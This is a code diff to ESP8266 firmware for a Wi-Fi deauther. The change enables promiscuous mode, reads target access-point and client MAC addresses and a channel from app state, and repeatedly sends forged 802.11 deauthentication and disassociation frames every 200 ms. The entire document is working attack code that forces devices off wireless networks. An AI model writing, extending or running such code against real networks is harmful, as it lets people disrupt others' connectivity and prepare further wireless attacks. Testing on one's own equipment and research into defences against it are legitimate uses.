@@ -1,6 +1,7 @@
 #include "deauther.h"
 
 #include <ESP8266WiFi.h>
+#include "app_state.h"
 
 extern "C"
 {
@@ -28,83 +29,98 @@ static uint8_t deauthPacket[26] = {
 
 void initDeauther()
 {
-    // Inicializar WiFi para modo promiscuo se necessário
-    // Mas por enquanto, assume que WiFi já está configurado
+  wifi_set_opmode(STATION_MODE);
+  wifi_promiscuous_enable(1);
+  Serial.println("Deauther initialized with promiscuous mode");
+}
+
+uint8_t *parseMac(String macStr)
+{
+  static uint8_t mac[6];
+  sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
+  return mac;
 }
 
 void sendDeauth(uint8_t *apMac, uint8_t *clientMac, uint8_t channel, uint8_t reason = 7)
 {
-    // MUITO IMPORTANTE: Mudar para o canal do alvo
-    if (WiFi.channel() != channel) {
-        wifi_set_channel(channel);
-    }
+  // MUITO IMPORTANTE: Mudar para o canal do alvo
+  if (WiFi.channel() != channel)
+  {
+    wifi_set_channel(channel);
+    Serial.print("Changed to channel ");
+    Serial.println(channel);
+  }
 
-    // Deauth para o cliente
-    memcpy(&deauthPacket[4], clientMac, 6); // Receiver = Cliente
-    memcpy(&deauthPacket[10], apMac, 6);    // Transmitter = AP
-    memcpy(&deauthPacket[16], apMac, 6);    // BSSID = AP
-    deauthPacket[24] = reason;
+  // Deauth para o cliente
+  memcpy(&deauthPacket[4], clientMac, 6); // Receiver = Cliente
+  memcpy(&deauthPacket[10], apMac, 6);    // Transmitter = AP
+  memcpy(&deauthPacket[16], apMac, 6);    // BSSID = AP
+  deauthPacket[24] = reason;
 
-    // Envia rajada de deauth
-    for (int i = 0; i < 5; i++)
-    {
-      wifi_send_pkt_freedom(deauthPacket, 26, 0);
-      delayMicroseconds(200);
-    }
+  Serial.println("Sending deauth packets");
 
-    // Disassociation (muitas vezes mais efetivo)
-    deauthPacket[0] = 0xA0; // muda para disassociation
-    for (int i = 0; i < 5; i++)
-    {
-      wifi_send_pkt_freedom(deauthPacket, 26, 0);
-      delayMicroseconds(200);
-    }
+  // Envia rajada de deauth
+  for (int i = 0; i < 5; i++)
+  {
+    wifi_send_pkt_freedom(deauthPacket, 26, 0);
+    delayMicroseconds(200);
+  }
 
-    deauthPacket[0] = 0xC0; // volta para deauth
+  // Disassociation (muitas vezes mais efetivo)
+  deauthPacket[0] = 0xA0; // muda para disassociation
+  for (int i = 0; i < 5; i++)
+  {
+    wifi_send_pkt_freedom(deauthPacket, 26, 0);
+    delayMicroseconds(200);
+  }
+
+  deauthPacket[0] = 0xC0; // volta para deauth
 }
 
 void startDeauthAttack(uint8_t *apMac, uint8_t *clientMac, uint8_t channel, uint8_t reason)
 {
-    memcpy(targetApMac, apMac, 6);
-    memcpy(targetClientMac, clientMac, 6);
-    targetChannel = channel;
-    attackReason = reason;
-    attackActive = true;
-    lastAttackPacketAt = millis();
+  memcpy(targetApMac, apMac, 6);
+  memcpy(targetClientMac, clientMac, 6);
+  targetChannel = channel;
+  attackReason = reason;
+  attackActive = true;
+  lastAttackPacketAt = millis();
 
-    // Envia o primeiro imediatamente
-    sendDeauth(targetApMac, targetClientMac, targetChannel, attackReason);
+  // Envia o primeiro imediatamente
+  sendDeauth(targetApMac, targetClientMac, targetChannel, attackReason);
 }
 
 void stopDeauthAttack()
 {
-    attackActive = false;
+  attackActive = false;
 }
 
 bool isDeauthActive()
 {
-    return attackActive;
+  return attackActive;
 }
 
 void updateDeauth()
 {
-    if (attackActive && (millis() - lastAttackPacketAt > 200)) { // Envia a cada 200ms
-        sendDeauth(targetApMac, targetClientMac, targetChannel, attackReason);
-        lastAttackPacketAt = millis();
-    }
+  if (attackActive && (millis() - lastAttackPacketAt > 200))
+  { // Envia a cada 200ms
+    sendDeauth(targetApMac, targetClientMac, targetChannel, attackReason);
+    lastAttackPacketAt = millis();
+  }
 }
 
 void toggleDeauther()
 {
-    if (attackActive)
-    {
-        stopDeauthAttack();
-    }
-    else
-    {
-        // Example targets for demo - broadcast deauth
-        uint8_t apMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-        uint8_t clientMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-        startDeauthAttack(apMac, clientMac, 1, 7);
-    }
+  if (attackActive)
+  {
+    stopDeauthAttack();
+    Serial.println("Deauther stopped");
+  }
+  else
+  {
+    uint8_t *apMac = parseMac(deautherApMac);
+    uint8_t *clientMac = parseMac(deautherClientMac);
+    startDeauthAttack(apMac, clientMac, deautherChannel, 7);
+    Serial.println("Deauther started");
+  }
 }
